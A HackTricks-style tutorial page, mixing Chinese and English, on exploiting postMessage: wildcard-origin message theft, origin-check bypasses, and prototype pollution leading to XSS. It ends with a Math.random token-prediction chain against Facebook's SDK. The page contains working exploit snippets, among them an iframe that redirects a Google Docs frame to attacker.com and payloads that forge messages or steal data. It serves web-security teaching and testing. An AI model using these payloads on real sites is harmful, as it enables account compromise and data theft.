# PostMessage 漏洞

{{#include ../../banners/hacktricks-training.md}}

## 发送 **PostMessage**

**PostMessage** 使用以下函数发送消息：
```bash
targetWindow.postMessage(message, targetOrigin, [transfer]);

# postMessage to current page
window.postMessage('{"__proto__":{"isAdmin":True}}', '*')

# postMessage to an iframe with id "idframe"
<iframe id="idframe" src="http://victim.com/"></iframe>
document.getElementById('idframe').contentWindow.postMessage('{"__proto__":{"isAdmin":True}}', '*')

# postMessage to an iframe via onload
<iframe src="https://victim.com/" onload="this.contentWindow.postMessage('<script>print()</script>','*')">

# postMessage to popup
win = open('URL', 'hack', 'width=800,height=300,top=500');
win.postMessage('{"__proto__":{"isAdmin":True}}', '*')

# postMessage to an URL
window.postMessage('{"__proto__":{"isAdmin":True}}', 'https://company.com')

# postMessage to iframe inside popup
win = open('URL-with-iframe-inside', 'hack', 'width=800,height=300,top=500');
## loop until win.length == 1 (until the iframe is loaded)
win[0].postMessage('{"__proto__":{"isAdmin":True}}', '*')
```
Note that **targetOrigin** can be a '\*' or an URL like _https://company.com._\
在**第二种情景**中，**message 只能被发送到该域**（即使 Window 对象的 origin 不同）。\
如果使用了 **wildcard**，**messages 可能会被发送到任意域名**，并且会被发送到 Window 对象的 origin。

### Attacking iframe & wildcard in **targetOrigin**

As explained in [**this report**](https://blog.geekycat.in/google-vrp-hijacking-your-screenshots/) if you find a page that can be **iframed** (no `X-Frame-Header` protection) and that is **sending sensitive** message via **postMessage** using a **wildcard** (\*), you can **modify** the **origin** of the **iframe** and **leak** the **sensitive** message to a domain controlled by you.\
注意，如果页面可被 iframed，但 **targetOrigin** 被 **设置为一个 URL 而不是 wildcard**，这个 **trick 不会生效**。
```html
<html>
<iframe src="https://docs.google.com/document/ID" />
<script>
setTimeout(exp, 6000); //Wait 6s

//Try to change the origin of the iframe each 100ms
function exp(){
setInterval(function(){
window.frames[0].frame[0][2].location="https://attacker.com/exploit.html";
}, 100);
}
</script>
```
## addEventListener exploitation

**`addEventListener`** 是 JS 用来声明期望 `postMessages` 的函数。\
将使用类似下面的代码：
```javascript
window.addEventListener(
"message",
(event) => {
if (event.origin !== "http://example.org:8080") return

// ...
},
false
)
```
注意在这个例子中代码做的第一件事是**检查 origin**。这点非常**重要**，尤其当页面要对接收到的信息做**任何敏感操作**（比如修改密码）时。**如果不检查 origin，攻击者可以让受害者向这些 endpoints 发送任意数据**，并在本例中修改受害者的密码。

### Enumeration

为了在当前页面中**找到 event listeners**，你可以：

- **搜索** JS 代码中的 `window.addEventListener` 和 `$(window).on` (_JQuery version_)
- 在开发者工具的控制台中**执行**：`getEventListeners(window)`

![](<../../images/image (618) (1).png>)

- 在浏览器的开发者工具中**进入** _Elements --> Event Listeners_

![](<../../images/image (396).png>)

- 使用像 [**https://github.com/benso-io/posta**](https://github.com/benso-io/posta) 或 [https://github.com/fransr/postMessage-tracker](https://github.com/fransr/postMessage-tracker) 这样的浏览器扩展。该浏览器扩展会**拦截所有消息**并展示给你。

### Origin check bypasses

- **`event.isTrusted`** 属性被认为是安全的，因为它只在事件由真实用户操作生成时返回 `True`。如果正确实现，绕过它很困难，但它在安全检查中的重要性不可忽视。
- 在 PostMessage 事件的 origin 验证中使用 **`indexOf()`** 可能会被绕过。下面的示例说明了这种脆弱性：

```javascript
"https://app-sj17.marketo.com".indexOf("https://app-sj17.ma")
```

- 来自 `String.prototype.search()` 的 **`search()`** 方法是为正则表达式设计的，而不是字符串。传入非 regexp 的值会导致对 regexp 的隐式转换，从而使该方法可能不安全。因为在正则中，点号 (.) 会作为通配符，从而允许使用精心构造的域名绕过验证。例如：

```javascript
"https://www.safedomain.com".search("www.s.fedomain.com")
```

- **`match()`** 函数与 `search()` 类似，会处理正则表达式。如果正则表达式构造不当，可能也易于被绕过。
- **`escapeHtml`** 函数本意是通过转义字符来净化输入。但它不会创建一个新的转义对象，而是覆盖现有对象的属性。这种行为可以被利用。尤其是，如果一个对象可以被操纵，使得其受控属性不承认 `hasOwnProperty`，`escapeHtml` 就无法按预期工作。下面的示例说明了这一点：

- 预期失败：

```javascript
result = u({
message: "'\"<b>\\",
})
result.message // "&#39;&quot;&lt;b&gt;\"
```

- 绕过转义：

```javascript
result = u(new Error("'\"<b>\\"))
result.message // "'"<b>\"
```

在此类漏洞中，`File` 对象尤其易被利用，因为它的 `name` 属性是只读的。当该属性在模板中使用时，`escapeHtml` 无法对其进行净化，从而导致潜在的安全风险。

- JavaScript 中的 `document.domain` 属性可以被脚本设置为缩短域名，从而允许在相同父域内放宽同源策略的限制。

### e.origin == window.origin bypass

When embedding a web page within a **sandboxed iframe** using %%%%%%, it's crucial to understand that the iframe's origin will be set to null. This is particularly important when dealing with **sandbox attributes** and their implications on security and functionality.

By specifying **`allow-popups`** in the sandbox attribute, any popup window opened from within the iframe inherits the sandbox restrictions of its parent. This means that unless the **`allow-popups-to-escape-sandbox`** attribute is also included, the popup window's origin is similarly set to `null`, aligning with the iframe's origin.

Consequently, when a popup is opened under these conditions and a message is sent from the iframe to the popup using **`postMessage`**, both the sending and receiving ends have their origins set to `null`. This situation leads to a scenario where **`e.origin == window.origin`** evaluates to true (`null == null`), because both the iframe and the popup share the same origin value of `null`.

For more information **read**:


{{#ref}}
bypassing-sop-with-iframes-1.md
{{#endref}}

### Bypassing e.source

可以检查消息是否来自脚本正在监听的同一个 window（这对来自浏览器扩展的 Content Scripts 特别有趣，用来检查消息是否来自同一页面）：
```javascript
// If it’s not, return immediately.
if (received_message.source !== window) {
return
}
```
你可以通过创建一个**iframe**，该 **iframe** **发送** **postMessage** 并被**立即删除**，从而将消息的 **`e.source`** 强制设为 null。

For more information **read:**


{{#ref}}
bypassing-sop-with-iframes-2.md
{{#endref}}

### X-Frame-Header 绕过

为了执行这些攻击，理想情况下你应该能够**将受害者网页放入**一个 `iframe`。但是像 `X-Frame-Header` 这样的某些 header 会**阻止**那种**行为**。\
在那些场景中你仍然可以使用一种不那么隐蔽的攻击。你可以在新标签页中打开易受攻击的 web 应用并与其通信：
```html
<script>
var w=window.open("<url>")
setTimeout(function(){w.postMessage('text here','*');}, 2000);
</script>
```
### 通过阻塞主页面窃取发送给子页面的消息

在下面的页面中你可以看到如何在发送数据之前**blocking** **main** 页面，并滥用子页面中的 **XSS**，在数据被接收之前**leak the data**，从而窃取发送到**child iframe** 的**sensitive postmessage data**：

{{#ref}}
blocking-main-page-to-steal-postmessage.md
{{#endref}}

### 通过修改 iframe location 窃取消息

如果你能 iframe 一个没有 X-Frame-Header 的包含另一个 iframe 的网页，你可以**change the location of that child iframe**，因此如果它正在接收使用**postmessage**通过**wildcard**发送的消息，攻击者就可以**change**该 iframe 的**origin**到一个由他**controlled**的页面并**steal**该消息：

{{#ref}}
steal-postmessage-modifying-iframe-location.md
{{#endref}}

### postMessage 到 Prototype Pollution 和/或 XSS

在通过 `postMessage` 发送的数据会被 JS 执行的场景中，你可以对该页面进行 **iframe** 并通过 `postMessage` 发送利用代码来**exploit** **prototype pollution/XSS**。

关于通过 `postMessage` 导致的 XSS 的几篇非常好的讲解可以在 [https://jlajara.gitlab.io/web/2020/07/17/Dom_XSS_PostMessage_2.html](https://jlajara.gitlab.io/web/2020/07/17/Dom_XSS_PostMessage_2.html) 找到

下面是一个通过向 `iframe` 发送 `postMessage` 来滥用 **Prototype Pollution and then XSS** 的 exploit 示例：
```html
<html>
<body>
<iframe
id="idframe"
src="http://127.0.0.1:21501/snippets/demo-3/embed"></iframe>
<script>
function get_code() {
document
.getElementById("iframe_victim")
.contentWindow.postMessage(
'{"__proto__":{"editedbymod":{"username":"<img src=x onerror=\\"fetch(\'http://127.0.0.1:21501/api/invitecodes\', {credentials: \'same-origin\'}).then(response => response.json()).then(data => {alert(data[\'result\'][0][\'code\']);})\\" />"}}}',
"*"
)
document
.getElementById("iframe_victim")
.contentWindow.postMessage(JSON.stringify("refresh"), "*")
}

setTimeout(get_code, 2000)
</script>
</body>
</html>
```
For **more information**:

- 链接到关于 [**prototype pollution**](../deserialization/nodejs-proto-prototype-pollution/index.html) 的页面
- 链接到关于 [**XSS**](../xss-cross-site-scripting/index.html) 的页面
- 链接到关于 [**client side prototype pollution to XSS**](../deserialization/nodejs-proto-prototype-pollution/index.html#client-side-prototype-pollution-to-xss) 的页面

### 在 postMessage 桥接中预测 **`Math.random()`** 回调令牌

当消息验证使用由 `Math.random()` 生成的“shared secret”（例如，`guid() { return "f" + (Math.random() * (1<<30)).toString(16).replace(".", "") }`），并且相同的辅助函数也用来命名 plugin iframes 时，你可以恢复 PRNG 输出并伪造受信任的消息：

- **Leak PRNG outputs via `window.name`:** SDK 使用 `guid()` 自动为 plugin iframes 命名。如果你控制顶层框架，可将受害页面放入 iframe，然后把 plugin iframe 导航到你的源（例如，`window.frames[0].frames[0].location='https://attacker.com'`），并读取 `window.frames[0].frames[0].name` 来获取原始的 `Math.random()` 输出。
- **Force more outputs without reloads:** 一些 SDK 暴露 reinit 路径；在 FB SDK 中，触发 `init:post` 并带 `{xfbml:1}` 会强制 `XFBML.parse()`，销毁/重建 plugin iframe，并生成新的 names/callback IDs。重复 reinit 可产生所需数量的 PRNG 输出（注意内部为 callback/iframe ID 可能有额外的 `Math.random()` 调用，所以解算器必须跳过中间值）。
- **Trusted-origin delivery via parameter pollution:** 如果一个 first-party plugin endpoint 在跨窗口 payload 中反射了未消毒的参数（例如，`/plugins/feedback.php?...%23relation=parent.parent.frames[0]%26cb=PAYLOAD%26origin=TARGET`），你可以在保留受信任的 `facebook.com` origin 的同时注入 `&type=...&iconSVG=...`。
- **Predict the next callback:** 将泄露的 iframe 名称转换回 `[0,1)` 范围的浮点数，并把若干值（即使非连续）输入到 V8 `Math.random` 预测器（例如基于 Z3 的）。在本地生成下一个 `guid()` 以伪造预期的 callback token。
- **Trigger the sink:** 构造 postMessage 数据，使桥接分发 `xd.mpn.setupIconIframe` 并在 `iconSVG` 中注入 HTML（例如，URL 编码的 `<img src=x onerror=...>`），从而在承载 origin 内实现 DOM XSS；从那里可以读取 same-origin iframes（OAuth 对话框、arbiters 等）。
- **Framing quirks help:** 该链需要 framing。在一些 mobile webviews 中，当存在 `frame-ancestors` 时，`X-Frame-Options` 可能降级为不受支持的 `ALLOW-FROM`，并且“compat”参数可以强制宽松的 `frame-ancestors`，从而启用 `window.name` 侧信道。

#### 最小伪造消息示例
```javascript
// predictedFloat is the solver output for the next Math.random()
const callback = "f" + (predictedFloat * (1 << 30)).toString(16).replace(".", "")
const payload =
callback +
"&type=mpn.setupIconIframe&frameName=x" +
"&iconSVG=%3cimg%20src%3dx%20onerror%3dalert(document.domain)%3e"
const fbMsg = `https://www.facebook.com/plugins/feedback.php?api_key&channel_url=https://staticxx.facebook.com/x/connect/xd_arbiter/?version=42%23relation=parent.parent.frames[0]%26cb=${encodeURIComponent(payload)}%26origin=https://www.facebook.com`
iframe.location = fbMsg // sends postMessage from facebook.com with forged callback
```
## 参考资料

- [https://jlajara.gitlab.io/web/2020/07/17/Dom_XSS_PostMessage_2.html](https://jlajara.gitlab.io/web/2020/07/17/Dom_XSS_PostMessage_2.html)
- [https://dev.to/karanbamal/how-to-spot-and-exploit-postmessage-vulnerablities-36cd](https://dev.to/karanbamal/how-to-spot-and-exploit-postmessage-vulnerablities-36cd)
- 练习：[https://github.com/yavolo/eventlistener-xss-recon](https://github.com/yavolo/eventlistener-xss-recon)
- [Facebook JavaScript SDK Math.random callback prediction → DOM XSS writeup](https://ysamm.com/uncategorized/2026/01/17/math-random-facebook-sdk.html)
- [V8 Math.random() state recovery (Z3 predictor)](https://github.com/PwnFunction/v8-randomness-predictor)

{{#include ../../banners/hacktricks-training.md}}
